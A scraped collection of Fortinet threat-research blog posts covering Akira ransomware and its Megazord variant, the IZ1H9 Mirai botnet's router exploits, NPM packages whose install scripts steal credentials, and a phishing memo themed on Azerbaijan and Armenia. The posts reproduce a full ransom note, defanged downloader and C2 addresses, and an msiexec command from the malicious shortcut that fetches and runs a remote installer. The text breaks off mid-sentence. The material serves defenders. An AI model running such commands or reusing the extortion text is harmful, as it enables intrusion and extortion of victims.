information on victim organizations. The Akira attacker has also made that data available on Torrent. Another command, “news,” brings up a list of victim organizations and their information. As of September 22, 2023, the latest victims had been posted on September 18. The Akira ransomware has claimed six victims so far in September 2023. The group went hot in August, victimizing more than 20 organizations. We have also observed at least a few minor variants of Akira ransomware. The latest minor variant is Megazord, which came out in late August 2023. “Megazord” evokes the giant robot from the Japanese superhero drama series Power Rangers. The attacker’s pick of “Megazord” is fitting for an Akira variant as the name “Akira” was most likely taken from a popular Japanese cyberpunk comic and movie with the same name. The variant drops a ransom note labeled “powerranges.txt”. The content of “powerranges.txt” is below: Hi friends, Whatever who you are and what your title is if you're reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption. Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment, you have to know: 1. Dealing with us you will save A LOT dueto we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal. 2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. If you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them - in this case we won't be able to help. 3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we've managed to detect and used in order to get into, identify backup solutions and upload your data. 4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes - generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones. Then all of this will be published in our blog - https://akira[removed].onion. 5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us. If you're indeed interested in our assistance and the services we provide you can reach out to us following simple instructions: 1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/. 2. Paste this link - https://akira[removed].onion. 3. Use this code – [removed] - to log into our chat. Keep in mind that the faster you will get in touch, the less damage we cause. As shown, Megazord’s ransom note asks victims to visit the Akira ransomware’s TOR site. There is one other Megazord ransomware variant. However, that variant only has the attacker’s Telegram channel and Tox ID for contact methods. Interestingly, Megazord is written in Rust, whereas a typical Akira build is in C++. This may indicate that future Akira variants will be written in Rust or that it is going through a rebranding. Only time will tell. Older minor variants came out in May and June of 2023. One minor variant from May adds a “.iqoj” extension to the encrypted files and leaves a ransom note labeled “readme-asldkas.txt.” Another minor variant from June appends a “.zhq” extension to encrypted files and drops “help-you.txt” as a ransom note. Although the file extensions and ransom note names do not have any “Akira” in them, they still lead victims to Akira’s TOR site. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Akira ransomware samples with the following AV signature: FortiGuard Labs detects minor variants of the Akira ransomware samples with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. SHA2 Note 2a9257c6c74e37d051f78ed5abaa620b71b27fa3604798af077256a128d911bb Windows version of Akira ransomware 3f4ceeada7ff021c30df1646437d2ab0e55997bbb281444501f6d1f4ea8fa209 Windows version of Akira ransomware fb2433beb961839b36198e242d0dedb7fa85ab3e08a1141d02874aa4235ac776 Windows version of Akira ransomware c239dadd55b55b817fda5b0c2bb062adf399a5b78a8b3280a473d3ae66f81777 Windows version of Akira ransomware 4cb8365b18b1c319d374be0b9d219144c20fb8714e9cf346e655f854d2c60170 Windows version of Akira ransomware 772eb611c9ca20b461536fd0bd87d553dcecf3f4c82e26c2378cad40bbf4b0b0 Windows version of Akira ransomware 2e2ad6392e75d5a5155498c2a76cb373d17ca3ad4ba57c6d33c623fca5e29342 Windows version of Akira ransomware 92072945358b605c024b9e3335fb33b82faf33048c56f5529aaf5af4bf0c1b30 Windows version of Akira ransomware 4aaa583a9c554ea8e73d4dee0d53eb12dda17df16388f96c0f6ddbaafbcda813 Windows version of Akira ransomware 637e28b38086ff9efd1606805ff57aaf6cdec4537378f019d6070a5efdc9c983 Windows version of Akira ransomware 2084ab8f92a86a37a35879378610949e21ea7b5030313655bb82fe6c67772b0d Windows version of Akira ransomware 473326da3fff09ee3e486f5f39c090690437ac8bf8bdce556c8033e8f0d730fc Windows version of Akira ransomware b3f473b0fd752fcd8b0d5983366c4ccccdacdceb8d6ba25fcb02b34c622cca78 Windows version of Akira ransomware cfbcea795524c69a6d28fd9e60e07437d8f2abd23812109430ca2efd46606310 Windows version of Akira ransomware 337d21f964091417f22f35aee35e31d94fc3f35179c36c0304eef6e4ae983292 Windows version of Akira ransomware 6cadab96185dbe6f3a7b95cf2f97d6ac395785607baa6ed7bf363deeb59cc360 Windows version of Akira ransomware 9ca333b2e88ab35f608e447b0e3b821a6e04c4b0c76545177890fb16adcab163 Windows version of Akira ransomware d0510e1d89640c9650782e882fe3b9afba00303b126ec38fdc5f1c1484341959 Windows version of Akira ransomware 920384692233578a59fc8de2b0205fd9fb20bb0d75c1d5a1534377abf0fc08bc Windows version of Akira ransomware 1b6af2fbbc636180dd7bae825486ccc45e42aefbb304d5f83fafca4d637c13cc Windows version of Akira ransomware 8631ac37f605daacf47095955837ec5abbd5e98c540ffd58bb9bf873b1685a50 Windows version of Akira ransomware 3c92bfc71004340ebc00146ced294bc94f49f6a5e212016ac05e7d10fcb3312c Windows version of Akira ransomware 7b295a10d54c870d59fab3a83a8b983282f6250a0be9df581334eb93d53f3488 Windows version of Akira ransomware 7613fbb940f83173aea126da5cf4319943155f4df25fd2e880eb0c03b1e273f0 Windows version of Akira ransomware 4839fd081e720d7d5091274470679c120378196e1f4faf80c4bac08d8ee7bb8c Windows version of Akira ransomware 678ec8734367c7547794a604cc65e74a0f42320d85a6dce20c214e3b4536bb33 Windows version of Akira ransomware 8bfa4c2c1065b105ec80a86f460e0e0221b39610109cc6cd4b441dd86e6b4aef Windows version of Akira ransomware 89f5f29cf6b5bcfc85b506fb916da66cb7fd398cf6011d58e9409c7813e1a6f3 Windows version of Akira ransomware 379ef7c4f6dfae8cc0c8556861ff41930b88c7d9b107a5de10ccd194e1bda0cb Windows version of Akira ransomware 27009c0abd2709cd5cac4c0135b8f3bed3229b0921601638ba9e90713ede91ea Windows version of Akira ransomware 8738ba49fcd520789569aea7bf7af890741a745c79ae2bef49b93fb46c076c2b Windows version of Akira ransomware 25a6758df930b32eed548fca56735f0ddde442b5662e51c625eadbbaf09c9e96 Windows version of Akira ransomware d371ee0aa4fa710c00173d296c999a5497a18b38c80095db68a2dc5e46ed35f7 Windows version of Akira ransomware 1d3b5c650533d13c81e325972a912e3ff8776e36e18bca966dae50735f8ab296 Linux version of Akira ransomware 82e25f32e01f1898ccce2b6d5292245759733c22a104443a8a9c7db1ebf05c57 Linux version of Akira ransomware 0c0e0f9b09b80d87ebc88e2870907b6cacb4cd7703584baf8f2be1fd9438696d Megazord ransomware (Akira variant) c9c94ac5e1991a7db42c7973e328fceeb6f163d9f644031bdfd4123c7b3898b0 Megazord ransomware (Akira variant) 67afa125bf8812cd943abed2ed56ed6e07853600ad609b40bdf9ad4141e612b4 IQOJ ransomware (Akira variant) 2b28270c1675990a2c78b31faab547fb75948dd1c2b22e892377ee5e40abebc2 ZHQ ransomware (Akira variant) Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-akira"
  },
  {
    "title": "IZ1H9 Campaign Enhances Its Arsenal with Scores of Exploits",
    "content": "FortiGuard Labs Threat Research Affected Platforms:LinuxImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical In September 2023, our FortiGuard Labs team observed that the IZ1H9 Mirai-based DDoS campaign has aggressively updated its arsenal of exploits. Thirteen payloads were included in this variant, including D-Link devices, Netis wireless router, Sunhillo SureLine, Geutebruck IP camera, Yealink Device Management, Zyxel devices, TP-Link Archer, Korenix Jetwave, and TOTOLINK routers. Based on the trigger counts recorded by our IPS signatures, it is evident that peak exploitation occurred on September 6, with trigger counts ranging from the thousands to even tens of thousands. This highlights the campaign's capacity to infect vulnerable devices and dramatically expand its botnet through the swift utilization of recently released exploit code, which encompasses numerous CVEs. In this article, we will elaborate on how this threat leverages new vulnerabilities to control affected devices, along with the details of IZ1H9. Four payloads,CVE-2015-1187,CVE-2016-20017,CVE-2020-25506, andCVE-2021-45382, target D-Link vulnerabilities. These critical-severity vulnerabilities can allow remote attackers to deliver command injection via a crafted request. Another exploit,CVE-2019-19356, targets Netis WF2419. It focuses on exploiting a Remote Code Execution (RCE) vulnerability through the tracert diagnostic tool because of a lack of user input sanitizing. The payload injects in parameter “tools_ip_url” and contains the “User-Agent: Dark” header used in the Dark.IoT Botnet. The campaign also seeks to exploit vulnerabilities discovered in 2021, includingCVE-2021-36380, which affect Sunhillo SureLine versions before 8.7.0.1.1,CVE-2021-33544/33548/33549/33550/33551/33552/33553/33554, which allow arbitrary command execution within the parameters of various pages on Geutebruck products, andCVE-2021-27561/27562, which affect Yealink Device Management (DM) 3.6.0.20. The next exploit targets the Zyxel device’s/bin/zhttpd/ componentvulnerability. If insufficient input validation is found, the attacker can exploit the vulnerability to launch a remote code execution attack on Zyxel EMG3525/VMG1312 before V5.50. The threat actor has also incorporated vulnerabilities discovered in 2023 into their exploit payload list.CVE-2023-1389specifically targets TP-Link Archer AX21 (AX1800), whileCVE-2023-23295impacts Korenix JetWave wireless AP. CVE-2022-40475/25080/25079/25081/25082/25078/25084/25077/25076/38511/25075/25083collectively represent a set of related vulnerabilities that focus on TOTOLINK routers. The last one is an unclear exploit payload. It targets “/cgi-bin/login.cgi” and injects a payload in the “key” parameter. A similar vulnerability affects theProlink PRC2402M router, but it is missing a few parameters to achieve remote code execution. It is unclear if the IZ1H9 campaign misused this payload or if they intended to target other devices. The injected payload in the above vulnerabilities intends to get a shell script downloader “l.sh” from hxxp://194[.]180[.]48[.]100. When the script is executed, it begins by deleting logs to conceal its actions. It then downloads and executes various bot clients to cater to diverse Linux architectures. In the final step, the shell script downloader obstructs network connections on multiple ports. This is achieved by altering the device's iptables rules, as illustrated in Figure 9. IZ1H9, a Mirai variant, infects Linux-based networked devices, especially IoT devices, turning them into remote-controlled bots for large-scale network attacks. The XOR key to decode configuration is 0xBAADF00D, shown in Figure 10. The additional payload downloader URLs can be extracted from the decoded configuration in Figure 11, namely hxxp://2[.]56[.]59[.]215/i.sh and hxxp://212[.]192[.]241[.]72/lolol.sh. Both were employed in May 2023. IZ1H9 also includes a data section with pre-set login credentials for brute-force attacks. The XOR decoding key is 0x54, shown in Figure 12, and the decoded data is in Figure 13. As for the C2 communication, victims first send a check-in message with the parameter “l.expl” to the C2 server “194[.]180[.]48[.]101:5034,” and it responds with a keep-alive message “\\x00\\x00.” Once the compromised devices receive a command from the C2 server, shown in Figure 14, they parse the packet to determine the DDoS attack method, target host, and packet count, if specified, before launching the attack. The message structure is as follows: IoT devices have long been an attractive target for threat actors, with remote code execution attacks posing the most common and concerning threats to both IoT devices and Linux servers. The exposure of vulnerable devices can result in severe security risks. Despite the availability of patches for these vulnerabilities, the number of exploit triggers remains alarmingly high, often numbering in the thousands. What amplifies the impact of the IZ1H9 Campaign are the rapid updates to the vulnerabilities it exploits. Once an attacker gains control of a vulnerable device, they can incorporate these newly compromised devices into their botnet, enabling them to launch further attacks like DDoS attacks and brute-force. To counter this threat, it is strongly recommended that organizations promptly apply patches when available and always change default login credentials for devices. The malware described in this report are detected and blocked byFortiGuard Antivirusas: BASH/Mirai.AEH!tr.dldrELF/Mirai.AT!trELF/Mirai.GG!trLinux/Mirai.L!trLinux/Mirai.REAL!trLinux/Mirai.IZ1H9!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released IPS signatures to proactively protect our customers from the threats contained in the exploit list. The URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. We also suggest our readers go through the freeNSE training: NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 194[.]180[.]48[.]1002[.]56[.]59[.]215212[.]192[.]241[.]72 c8cf29e56760c50fa815a0c1c14c17641f01b9c6a4aed3e0517e2ca722238f631e15d7cd0b4682a86620b3046548bdf3f39c969324a85755216c2a526d784c0d7b9dce89619c16ac7d2e128749ad92444fe33654792a8b9ed2a3bce1fee82e6ab5daf57827ced323a39261a7e19f5551071b5095f0973f1397d5e4c2fcc39930b523ea86ebfd666153078593476ca9bd069d6f37fa7846af9e53b1e01c977a178d07f15dd7d055b16d50cb271995b768fdd3ca6be121f6a35b61b917dfa3393834628bcfc40218095c65678b52ce13cea4904ce966d0fd47e691c3cb039871ecafc176f7b692a5ff93c7c66eee4941acf1b886ee9f4c070faf043b16f7e65c11df9ee47c783fbe8c3301ed519033fc92b05d7fd272d35c64b424a7e46c6da43b737ba9e84b5166134d491193be3305afa273733c35c028114d8b1f092940b9a30aa9836174f231074d4d55c819f6f1570a24bc3ed4d9dd5667a04664acb57147 mirai FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/Iz1h9-campaign-enhances-arsenal-with-scores-of-exploits"
  },
  {
    "title": "Malicious Packages Hidden in NPM",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where NPM packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, source code, etc.Severity level:High Over the past few months, the FortiGuard Labs team has discovered several malicious packages hidden in NPM (Node Package Manager), the largest software registry for the JavaScript programming language. These packages were found through a system dedicated to discover malicious open-source packages from various ecosystems e.g. PyPI, NPM. In this blog, we will look at some of these packages, grouping them based on similar styles of code or functions. In general, most of these malicious packages use install scripts that run pre or post-install. Whenever an NPM package is installed, those scripts are run as well. An example of this is shown below. Every package we found aims to steal sensitive data, such as system or user information, via a webhook or file-sharing link. Let’s explore the sets of packages below. This first set shows an obfuscated index.js script. However, we can identify some clues in the strings that may raise suspicions. Let’s try to simplify this code. After cleaning up the script, we can see it exfiltrates sensitive data, including Kubernetes configurations, SSH keys, and other critical information. It also gathers basic system fingerprinting details, like username, IP address, and hostname, without any prior warning. The index.js in this second set of packages sends an HTTP GET request to a specific URL, including query parameters. It scans for particular files and directories that may contain sensitive information. This script also enables the unauthorized extraction of critical developer data, including source code and configuration files. The targeted files and directories may contain highly valuable intellectual property and sensitive information, such as various application and service credentials. It then archives these files and directories and uploads the resulting archives to an FTP server. In this set, the index.mjs install script uses a Discord webhook to exfiltrate sensitive data, such as system information, username, and folder contents. As with the third set, this fourth set also uses an index.mjs install script and a Discord webhook to exfiltrate sensitive data. But this time, they use an alternate style of coding. This fifth set uses an index.js install script to exfiltrate host and username info and home users’ home directory contents via a webhook. This set—the most commonly found style—uses yet another index.js install script to exfiltrate information. In this set, the packages use an installer.js install script to carry out the attack, similar to the previous two, but we can see that the environment variable ‘NODE_TLS_REJECT_UNAUTHORIZED’ is set to ‘0’. This disables TLS certificate validation, which may make the connection insecure and vulnerable to man-in-the-middle attacks. This package automatically downloads and executes a potentially malicious executable file from a URL to a C:/ directory. This package uses another script style to gather system information, including the victim’s public IP address and then exfiltrates this information to a discord webhook. This blog groups together a collection of malicious NPM packages that use install scripts to steal users’ sensitive info based on styles of code or functions. End users should watch for packages that employ suspicious install scripts and exercise caution. We will continue hunting for and reporting malicious packages to help users avoid becoming victims. Fortiguard AntiVirus detects the malicious files identified in this report as @zola-helpers/client-1.0.1 index.mjs: JS/WebHook.CNYS!tr@zola-helpers/client-1.0.2 index.mjs: JS/WebHook.CNYS!tr@zola-helpers/client-1.0.3 index.mjs: JS/WebHook.CNYS!tr@next-translate-root/i18n-1.0.1 index.mjs: JS/WebHook.CNYS!tr@next-translate-root/i18n-1.0.2 index.mjs: JS/WebHook.CNYS!trsuncorp-styleguide-base-1.0.3 index.mjs: JS/WebHook.CNYS!trsuncorp-styleguide-base-1.0.4 index.mjs: JS/WebHook.CNYS!trsuncorp-styleguide-base-1.0.5 index.mjs: JS/WebHook.CNYS!tr@ag-grid-react/lib-1.0.1 index.mjs: JS/WebHook.CNYS!tr@next-translate-root/locales-1.0.0 index.mjs: JS/WebHook.CNYS!tr@next-translate-root/locales-1.0.1 index.mjs: JS/WebHook.CNYS!tr@next-translate-root/locales-1.0.2 index.mjs: JS/WebHook.CNYS!tr@dtx-company/flowcode-generator-types-200000.0.2 index.js: JS/Agent.OAST!trsquarespace-abtest-1.0.1 index.js: JS/Agent.OAST!trruamel.taml.clib-0.1.2 index.js: JS/Agent.OAST!trregily-1.0.0 index.js: JS/Agent.OAST!trdeveloper-scaffold-full-width-wrapper-1.9.9 index.js: JS/Agent.OAST!trdeveloper-scaffold-full-width-wrapper-21.0.9 index.js: JS/Agent.OAST!tr@abb-americas/angular-utilities-1.0.0 index.js: JS/Agent.OAST!tr@abb-americas/image-scaler-1.0.0 index.js: JS/Agent.OAST!tr@abdulmz/mz-test-1.1.1 index.js: JS/Agent.OAST!tr@ikea-aoa/component-financial-services index.js: JS/Agent.OAST!tr@ikea-aoa/component-lightbox-99.0.1 index.js: JS/Agent.OAST!tr@ikea-aoa/component-popover-99.0.0 index.js: JS/Agent.OAST!tr@cima/prism-utils-23.2.1 installer.js: JS/Agent.OAST!tr.dldr@cima/prism-utils-23.2.2 installer.js: JS/Agent.OAST!tr.dldrdiscorddd.jss-1.4.9 index.js: JS/Agent.CDPC!tr.dldrdiscorddd.jss-1.5.0 index.js: JS/Agent.CDPC!tr.dldrdiscorddd.jss-1.6.4 index.js: JS/Agent.CDPC!tr.dldrsaaaaaaaaaaaaaaaaaaaaaaa-1.4.2 index.js: JS/Agent.CDPC!tr.dldrevernote-thrift-1.9.99 index.js: JS/WebHook.ESY!tren-features-rollout-1.90.9 index.js: JS/WebHook.ESY!tren-conduit-electron-1.90.9 index.js: JS/WebHook.ESY!tren-conduit-electron-auth-1.90.9 index.js: JS/WebHook.ESY!tren-conduit-electron-worker-1.90.9 index.js: JS/WebHook.ESY!tren-thrift-internal-2.30.9 index.js: JS/WebHook.ESY!tren-conduit-electron-renderer-1.90.9 index.js: JS/WebHook.ESY!tr@expue/webpack-0.0.3-alpha.0 index.js: JS/Agent.ATTC!tr@expue/core-0.0.3-alpha.0 index.js: JS/Agent.ATTC!tr@expue/vue3-renderer-0.0.3-alpha.0 index.js: JS/Agent.ATTC!tr@fixedwidthtable/fixedwidthtable-0.0.2 index.js: JS/Agent.ATTC!tr@virtualsearchtable/virtualsearchtable-0.1.1 index.js: JS/Agent.ATTC!trbinarium-crm 1.0.0 index.js: JS/Agent.CFRE!tr.dldrbinarium-crm 1.0.9 index.js: JS/Agent.CFRE!tr.dldrbinarium-crm 1.9.9 index.js: JS/Agent.CFRE!tr.dldrcareer-service-client-0.1.6 index.js: JS/Agent.CFRE!tr.dldrcareer-service-client-0.1.13 index.js: JS/Agent.CFRE!tr.dldrcareer-service-client-0.1.15 index.js: JS/Agent.CFRE!tr.dldrhh-dep-monitoring-0.1.5 index.js: JS/Agent.CFRE!tr.dldrhh-dep-monitoring-0.1.14 index.js: JS/Agent.CFRE!tr.dldrorbitplate-1.0.4 index.js: JS/Agent.CFRE!tr.dldrorbitplate-1.0.6 index.js: JS/Agent.CFRE!tr.dldr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. @zola-helpers/client-1.0.1 index.mjs MD5: e905c2915762e6c1fa57ff3b444411da @zola-helpers/client-1.0.2 index.mjs MD5: 1e5a38b17453379af9107a9afce0963f @zola-helpers/client-1.0.3 index.mjs MD5: c7325f2347833eba9869926226027330 @next-translate-root/i18n-1.0.1 index.mjs MD5: cb37bd25c3011ffdd10c0db976c77b45 @next-translate-root/i18n-1.0.2 index.mjs MD5: c4bf513d91909de6d8c8e28fe317950a suncorp-styleguide-base-1.0.3 index.mjs MD5: 404c75ee8c8a2241e94773a5f46cd372 suncorp-styleguide-base-1.0.4 index.mjs MD5: 0b4da6e4a3d7f0d43afc1ce5a567aeed suncorp-styleguide-base-1.0.5 index.mjs MD5: fbf108d9534e2a065ba62198d7ab226c @ag-grid-react/lib-1.0.1 index.mjs MD5: 42d7f4f9e4d837c5f1217165e92d0136 @next-translate-root/locales-1.0.0 index.mjs MD5: 312368807bee4e8876acec4dba528f13 @next-translate-root/locales-1.0.1 index.mjs MD5: cb37bd25c3011ffdd10c0db976c77b45 @next-translate-root/locales-1.0.2 index.mjs MD5: c4bf513d91909de6d8c8e28fe317950a @dtx-company/flowcode-generator-types-200000.0.2 index.js MD5: 1b80da13c2d440b51de3e3b1f84b30b6 squarespace-abtest-1.0.1 index.js MD5: 0976fc4401a315d8182828d07b0e4a02 ruamel.taml.clib-0.1.2 index.js MD5: 489af9e516d133f8341bc50068b3a505 regily-1.0.0 index.js MD5: 8333f68439addfe5d80d7cf8646d74f6 developer-scaffold-full-width-wrapper-1.9.9 index.js MD5: c627ce5ec695ea663b88a09fb31ea319 developer-scaffold-full-width-wrapper-21.0.9 index.js MD5: 563cf757e5f61a592f53506c81360e4a @abb-americas/angular-utilities-1.0.0index.js MD5: 2965d88976fee79d1e3ef69e5edc5d83 @abb-americas/image-scaler-1.0.0index.js MD5: 0876c5969dc829f2f56b455ae38a2536 @abdulmz/mz-test-1.1.1index.js MD5: ecd47a29a7e5132f94b1c7c0689e2e5a @ikea-aoa/component-financial-services-99.0.1index.js MD5: 025809495e179b4f7ef0db8af88381e7 @ikea-aoa/component-lightbox-99.0.1index.js MD5: 025809495e179b4f7ef0db8af88381e7 @ikea-aoa/component-popover-99.0.0index.js MD5: 025809495e179b4f7ef0db8af88381e7 @cima/prism-utils-23.2.1 installer.js MD5: 42d84beccb38c08700920b70549f5a87 @cima/prism-utils-23.2.2 installer.js MD5: 25de187869441c3aa506ddc5fe6839ea discorddd.jss-1.4.9 index.js MD5: dc60d3e82ff0273309a2a9e1b7f89ea3 discorddd.jss-1.5.0 index.js MD5: 740eca0a347fe0d0aa8ca8ec4ebf2dd2 discorddd.jss-1.6.4 index.js MD5: 5182a61ee33247e2a426c4ddfe8196dc saaaaaaaaaaaaaaaaaaaaaaa-1.4.2 index.js MD5: 8458b6a4196e5d86e241c758ce89d1e5 evernote-thrift-1.9.99 index.js MD5: 359f456996c39e7882afeda8fbbf226f en-features-rollout-1.90.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 en-conduit-electron-1.90.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 en-conduit-electron-auth-1.90.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 en-conduit-electron-worker-1.90.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 en-thrift-internal-2.30.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 en-conduit-electron-renderer-1.90.9 index.js MD5: 0f67856db1e0c466d13079cc9cb16963 @expue/webpack-0.0.3-alpha.0 index.js MD5: 084c4c5a1d36fbdab6705a2fbd7e849e @expue/core-0.0.3-alpha.0 index.js MD5: 8b82f6112b22bd67cccc4ad238bfea7c @expue/vue3-renderer-0.0.3-alpha.0 index.js MD5: 084c4c5a1d36fbdab6705a2fbd7e849e @fixedwidthtable/fixedwidthtable-0.0.2 index.js MD5: 084c4c5a1d36fbdab6705a2fbd7e849e @virtualsearchtable/virtualsearchtable-0.1.1 index.js MD5: 37f9d6a97af8d7589bbc11aadcf185ec binarium-crm-1.0.0 index.js MD5: acf9777d3fabc82b49ddb096147de6a9 binarium-crm-1.0.9 index.js MD5: acf9777d3fabc82b49ddb096147de6a9 binarium-crm-1.9.9 index.js MD5: acf9777d3fabc82b49ddb096147de6a9 career-service-client-0.1.6 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 career-service-client-0.1.13 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 career-service-client-0.1.15 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 hh-dep-monitoring-0.1.5 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 hh-dep-monitoring-0.1.14 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 orbitplate-1.0.4 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 orbitplate-1.0.6 index.js MD5: 3d1dbd501ebaae4745f6ec37850f9ff5 Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-packages-hiddin-in-npm"
  },
  {
    "title": "Threat Actors Exploit the Tensions Between Azerbaijan and Armenia",
    "content": "FortiGuard Labs Threat Research In 1923, the Soviet Union created the Nagorno-Karabakh Autonomous Oblast (an oblast is an administrative region or province) within the Azerbaijan Soviet Socialist Republic. This oblast has a 95% ethnically Armenian population. In 1988, Nagorno-Karabakh declared its intention to leave Azerbaijan and join the neighboring Republic of Armenia. While the Soviet Union was able to keep the resulting tension under control, once the USSR began to collapse, armed conflict between Azerbaijan and Armenia began for control of the Nagorno-Karabakh region. While a ceasefire was tentatively reached in 1994 and again in 2020,tensions remain highbetween the two countries. Affected platforms:Microsoft WindowsImpacted parties:Targeted management associated with an Azerbaijanian companyImpact:Reconnaissance of basic computer info of targeted usersSeverity level:Low In August 2023, FortiGuard Labs discovered an infected memo pretending to come from the current president of a company in Azerbaijan and aimed at the management teams of associated businesses. Opening this memo downloads malware designed to gather basic information from its targets. This blog analyzes the attack chain, reviews the malware’s capabilities, and reveals the possible location of the threat actor behind it. FortiGuard Labs spotted this attack by finding the memo in Figure 2. The memo claims to have information about a border clash between soldiers from Azerbaijan and Armenia. The memo is in HTML format and usesHTML smugglingto automatically deliver a password-protected archive. This archive, as the memo suggests, contains several images. As shown in the attack diagram in Figure 3, the archive contains three clean images and one phony image. The actual contents are illustrated below. An astute observer may notice that the first \"image\" is not an image file. In reality, it is a .LNK shortcut that executes the following command: ..\\..\\Windows\\System32\\msiexec.exe /i \"https://dl[.]dropboxusercontent[.]com/scl/fi/zjxgh8ofdmfca8bpfntw9/karabakh.jpg.msi? rlkey=nidpjpx3ioigoq6qonibztwg4&dl=0\" This command downloads an .MSI (Microsoft Installer) file. Figure 3 shows this MS installer file performing two actions when clicked. The first action is to display an image with the same filename as the phony image shortcut (shown in the zip archive in Figure 4): This technique may fool some users into thinking the shortcut was simply an image file. But this is misdirection. Instead, the installer simultaneously loads hidden malware into the targeted computer. The malicious installer creates a new folder in the user’s %APPDATA% folder called “Windows Defender Health Check.” It also installs malware with the same name: C:\\Users\\[username]\\AppData\\Roaming\\Windows Defender Health Check\\WindowsDefenderHealthcheck.exe This malware is programmed in RUST, which is not the programming language of choice for most malware authors. This makes using standard analysis tools 